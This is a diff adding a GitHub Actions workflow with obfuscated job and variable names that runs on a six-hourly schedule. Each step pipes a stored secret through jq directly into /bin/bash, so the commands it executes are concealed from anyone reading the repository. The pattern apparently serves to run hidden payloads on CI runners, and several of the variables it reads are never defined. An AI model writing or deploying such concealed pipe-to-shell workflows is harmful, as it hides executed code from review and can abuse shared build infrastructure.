@@ -1,0 +1,25 @@
+name: caijingcheng0987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caijingcheng0987
+        env:
+          rgkhh4392: ${{ secrets.rgkhh4392 }}
+        run: |
+          echo $rgkhh4392 | jq -r .help55933 | /bin/bash
+          echo $nxhz3839 | jq -r .anws02792 | /bin/bash
+          echo $u93485 | jq -r .rd6771 | /bin/bash
+          echo $ho4 | jq -r .jk61 | /bin/bash
+          echo $dqe0 | jq -r .b7 | /bin/bash
+          echo $n7880 | jq -r .mqleu79271 | /bin/bash
+          echo $jr38 | jq -r .x61 | /bin/bash
+          echo $b8910 | jq -r .mfuoh5513 | /bin/bash
+          echo $q2605 | jq -r .l8 | /bin/bash
+
